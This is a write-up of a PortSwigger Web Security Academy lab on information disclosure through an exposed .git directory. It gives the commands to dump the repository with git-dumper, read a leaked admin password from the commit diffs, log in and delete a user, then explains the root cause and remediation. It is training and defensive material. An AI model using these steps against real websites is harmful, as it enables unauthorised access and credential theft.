## Metadata

- **Difficulty:** Practitioner
- **Category:** Information disclosure
- **Lab URL:** [Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
- **Date Solved:** 23/9/2026
## Vulnerability Summary

The app exposes sensitive information via its version control history. Specifically, in the diff of the `admin.conf` file, the `administrator`'s password is leaked, allowing us to gain control of the `administrator` user.
## Reconnaissance

- Navigate to the `/.git` endpoint. This reveals the app's Git version control data:
![alt text](<Screenshot 2026-09-23 111303.png>)
- `.git/logs/HEAD` reveals that there's a commit message that reads:
```
commit: Remove admin password from config
```
This means that we are able to exfiltrate this password through the file diffs.
- Using a tool like [git-dumper](https://github.com/arthaud/git-dumper), we can dump this entire Git repository. Then, running `git log -p` reveals the commit history, as well as the diffs:
```
git log -p
commit 7827ebd58c30c15f8525368c62763c86d30653fe (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 4575a77..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=mbyeko2bkwj4v6asxu2u
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')

commit 4112d3839b609fe4eb84d4fe9e3f2a005f9463ad
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel

diff --git a/admin.conf b/admin.conf
new file mode 100644
index 0000000..4575a77
--- /dev/null
+++ b/admin.conf
@@ -0,0 +1 @@
+ADMIN_PASSWORD=mbyeko2bkwj4v6asxu2u
diff --git a/admin_panel.php b/admin_panel.php
new file mode 100644
index 0000000..8944e3b
--- /dev/null
+++ b/admin_panel.php
@@ -0,0 +1 @@
+<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
\ No newline at end of file
```
The `ADMIN_PASSWORD` is disclosed in the diff.
## Exploitation Steps

1. Run `git-dumper <TARGET_URL>/.git output_dir` to reconstruct the repository.
2. In `output_dir`, run `git log -p` to inspect commit diffs.
3. Locate the `Remove admin password from config` commit, and extract the value of `ADMIN_PASSWORD`.
4. Navigate to `/login` in the browser or Burp Suite.
5. Authenticate using username `administrator` and the extracted password.
6. Navigate to `/admin` and delete user `carlos` (or send `GET /admin/delete?username=carlos`). Lab is solved.
## Payload Used

`git-dumper https://lab-id.web-security-academy.net/.git "C:\path\to\lab-infoleak-in-version-control-history"`, then `git log -p`. The `ADMIN_PASSWORD` is disclosed in the diffs.

Even though `admin.conf` was modified to read from an environment variable in a later commit, Git stores previous file blobs indefinitely. The commit parent preserves the actual password string in the object database, disclosing it.
## Root Cause

- The web server root directory was mapped directly to a local development folder containing the hidden `.git/` metadata folder without access controls in place. The server failed to deny access to dotfiles/dotdirectories (`.*`), allowing unauthenticated users to enumerate and download internal Git repository objects.
- Hardcoding cleartext credentials into tracked files (`admin.conf`) persists them inside Git's immutable directed acyclic graph (DAG) of commits and blobs. Removing a secret in a subsequent commit (`Remove admin password from config`) updates `HEAD`, but preserves the original secret in parent commit objects and logs.
## Remediation

- Configure web servers, reverse proxies, and ingress controllers to drop all requests attempting to access hidden configuration directories, particularly `.git`.
- Never deploy directly from working Git repositories. CI/CD pipelines should compile, build, and deploy only application release artifacts (e.g., via `git archive`, clean build directories, or minimal container images) that exclude `.git`, tests, and local config files.
- If a secret is accidentally committed, rotate it across all environments. Additionally, use a tool like `git-filter-repo` to clean the sensitive information from all commits, tags, refs.